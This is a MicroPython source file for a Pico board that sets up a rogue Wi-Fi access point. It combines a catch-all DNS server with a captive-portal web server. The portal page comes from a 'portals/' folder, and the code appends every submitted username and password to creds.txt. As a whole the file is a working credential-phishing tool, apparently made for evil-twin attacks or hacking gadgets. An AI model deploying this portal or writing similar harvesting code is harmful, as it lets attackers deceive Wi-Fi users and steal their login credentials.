# Big thanks to Chris Hager for the original code.
# You can find him at <chris@linuxuser.at> or https://github.com/metachris/
import gc
import sys
import network
import socket
import uasyncio as asyncio
from machine import Pin

# Helper to detect uasyncio v3
IS_UASYNCIO_V3 = hasattr(asyncio, "__version__") and asyncio.__version__ >= (3,)

wifi_interface = network.WLAN(network.AP_IF)

# DNS settings
SERVER_IP = '192.168.4.1'

# Path to the portal files
portal_path = "portals/Test/"


def read_config_file(path):
    """Reads SSID and PASS from config.txt."""
    config = {"SSID": "default_ssid", "PASS": ""}
    try:
        with open(f"{path}/config.txt", "r") as f:
            for line in f:
                if line.strip():
                    key, value = map(str.strip, line.split("=", 1))
                    config[key.upper()] = value.strip('"')
    except FileNotFoundError:
        print("config.txt not found, using default values.")
    return config


# Start the access point, slightly different from the original code as pico handles the wifi differently
def start_access_point(local_ip="192.168.4.1", essid=None, password=None):
    if essid is None:
        essid = "test"

    if password:
        wifi_interface.config(essid=essid, security=3, password=password)
    else:
        wifi_interface.config(essid=essid, security=0)

    wifi_interface.active(True)


def _handle_exception(loop, context):
    """ uasyncio v3 only: global exception handler """
    sys.print_exception(context["exception"])
    sys.exit()


class DNSQuery:
    def __init__(self, data):
        self.data = data
        self.domain = ''
        tipo = (data[2] >> 3) & 15  # Opcode bits
        if tipo == 0:  # Standard query
            ini = 12
            lon = data[ini]
            while lon != 0:
                self.domain += data[ini + 1:ini + lon + 1].decode('utf-8') + '.'
                ini += lon + 1
                lon = data[ini]

    def response(self, ip):
        """Generate DNS response packet."""
        if self.domain:
            packet = self.data[:2] + b'\x81\x80'
            packet += self.data[4:6] + self.data[4:6] + b'\x00\x00\x00\x00'  # Questions and Answers Counts
            packet += self.data[12:]  # Original Domain Name Question
            packet += b'\xC0\x0C'  # Pointer to domain name
            packet += b'\x00\x01\x00\x01\x00\x00\x00\x3C\x00\x04'  # Response type, ttl and resource data length -> 4 bytes
            packet += bytes(map(int, ip.split('.')))  # 4bytes of IP
        return packet


# Define the button to stop
button_left = [Pin(13, Pin.IN, Pin.PULL_UP), Pin(6, Pin.IN, Pin.PULL_UP)]


class MyApp:
    def __init__(self):
        self.stop_requested = False

    def setup_button_interrupts(self):
        """Set up button interrupts to stop the captive portal."""
        for btn in button_left:
            btn.irq(trigger=Pin.IRQ_FALLING, handler=self.request_stop)

    def request_stop(self, pin):
        """Handler to set stop_requested flag."""
        self.stop_requested = True

    async def start(self):
        # Get the event loop
        loop = asyncio.get_event_loop()

        # Add global exception handler
        if IS_UASYNCIO_V3:
            loop.set_exception_handler(_handle_exception)

        # Set up button interrupts
        self.setup_button_interrupts()

        # Read configuration file
        config = read_config_file(portal_path)
        ssid = config.get("SSID")
        password = config.get("PASS")

        # Start the wifi AP
        start_access_point(essid=ssid, password=password)

        # Create the server and add task to event loop
        server = asyncio.start_server(self.handle_http_connection, "0.0.0.0", 80)
        self.server_task = loop.create_task(server)

        # Start the DNS server task
        self.dns_task = loop.create_task(self.run_dns_server())

        # Start looping forever
        while not self.stop_requested:
            await asyncio.sleep(0.1)

        await self.stop()

    async def handle_http_connection(self, reader, writer):
        gc.collect()

        # Get HTTP request line
        data = await reader.readline()
        request_line = data.decode()

        # Read headers to handle POST data
        content_length = 0
        while True:
            gc.collect()
            line = await reader.readline()
            if line == b'\r\n':
                break
            if line.lower().startswith(b'content-length:'):
                content_length = int(line.decode().split(':')[1].strip())

        # Handle POST requests
        if "POST" in request_line:
            post_data = await reader.read(content_length)
            params = dict(item.split('=') for item in post_data.decode().split('&'))
            username = params.get('username', '')
            password = params.get('password', '')
            with open('creds.txt', 'a') as f:
                f.write(f"{username} : {password}\n")
            response = 'HTTP/1.0 200 OK\r\n\r\nCredentials saved.'
        else:
            # Handle GET requests
            try:
                with open(f"{portal_path}/index.html") as f:
                    response = 'HTTP/1.0 200 OK\r\n\r\n' + f.read()
            except FileNotFoundError:
                response = 'HTTP/1.0 404 NOT FOUND\r\n\r\nPage not found.'

        await writer.awrite(response)
        await writer.aclose()

    async def run_dns_server(self):
        """Function to handle incoming DNS requests."""
        udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        udps.setblocking(False)
        udps.bind(('0.0.0.0', 53))

        while not self.stop_requested:
            try:
                if IS_UASYNCIO_V3:
                    yield asyncio.core._io_queue.queue_read(udps)
                else:
                    yield asyncio.IORead(udps)
                data, addr = udps.recvfrom(4096)

                DNS = DNSQuery(data)
                udps.sendto(DNS.response(SERVER_IP), addr)

            except Exception:
                await asyncio.sleep_ms(3000)

        udps.close()

    # Stop the server
    async def stop(self):
        if hasattr(self, 'server_task') and self.server_task:
            self.server_task.cancel()
            try:
                await self.server_task
            except asyncio.CancelledError:
                pass

        if hasattr(self, 'dns_task') and self.dns_task:
            self.dns_task.cancel()
            try:
                await self.dns_task
            except asyncio.CancelledError:
                pass

        loop = asyncio.get_event_loop()
        loop.stop()
        wifi_interface.active(False)


def startup(given_path=None):
    if given_path:
        global portal_path
        portal_path = given_path
    """Main code entrypoint."""
    try:
        myapp = MyApp()
        if IS_UASYNCIO_V3:
            asyncio.run(myapp.start())
        else:
            loop = asyncio.get_event_loop()
            loop.run_until_complete(myapp.start())
    except Exception:
        pass
    finally:
        if IS_UASYNCIO_V3:
            asyncio.new_event_loop()  # Clear retained state
